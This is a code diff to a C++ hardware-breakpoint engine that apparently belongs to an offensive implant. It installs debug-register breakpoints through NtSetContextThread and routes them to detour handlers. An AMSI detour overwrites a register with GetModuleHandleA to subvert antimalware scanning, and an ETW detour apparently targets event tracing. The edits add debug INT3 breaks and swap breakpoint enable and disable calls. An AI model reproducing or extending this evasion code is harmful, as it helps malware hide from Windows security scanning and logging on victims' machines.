@@ -29,7 +29,7 @@ auto DECLFN HwbpEng::Install(
     NewEntry->ThreadID = ThreadID;
     NewEntry->Address  = Address;
     NewEntry->Detour   = (decltype(NewEntry->Detour))Callback;
-    NewEntry->This     = this;
+    NewEntry->This     = Self;
     NewEntry->Next     = nullptr;
     NewEntry->Prev     = nullptr;
 
@@ -78,13 +78,15 @@ auto DECLFN HwbpEng::SetBreak(
         return FALSE;
     }
 
-    if (Init) {
+    if ( Init ) {
         (&Ctx.Dr0)[Drx] = Address;
         Ctx.Dr7 = this->SetDr7( Ctx.Dr7, 3, (Drx * 2), 2 ); // active breakpoint
     } else {
         (&Ctx.Dr0)[Drx] = 0;
         Ctx.Dr7 = this->SetDr7( Ctx.Dr7, 0, (Drx * 2), 2 ); // desactive breakpoint
     }
+
+    
 
     Status = Self->Ntdll.NtSetContextThread( Handle, &Ctx );
     
@@ -319,14 +321,18 @@ auto DECLFN HwbpEng::MainHandler(
                 Current->Processed = TRUE;
             }
     
-            if ( ! this->SetBreak( Self->Session.ThreadID, Current->Address, Current->Drx, TRUE ) ) {
+            KhDbg("break");
+            INT3BRK
+            if ( ! this->SetBreak( Self->Session.ThreadID, Current->Address, Current->Drx, FALSE ) ) {
                 goto _KH_END;
             }
     
             VOID ( *Detour )( PCONTEXT, PVOID ) = Current->Detour;
             Detour( e->ContextRecord, Self );
     
-            if ( ! this->SetBreak( Self->Session.ThreadID, Current->Address, Current->Drx, FALSE ) ) {
+            KhDbg("break");
+            INT3BRK
+            if ( ! this->SetBreak( Self->Session.ThreadID, Current->Address, Current->Drx, TRUE ) ) {
                 goto _KH_END;
             }
     
@@ -454,6 +460,7 @@ auto DECLFN HwbpEng::EtwDetour(
 auto DECLFN HwbpEng::AmsiDetour(
     _In_ PCONTEXT Ctx
 ) -> VOID {
+    INT3BRK
     Ctx->Rdx  = (UPTR)Self->Krnl32.GetModuleHandleA;
 }
 
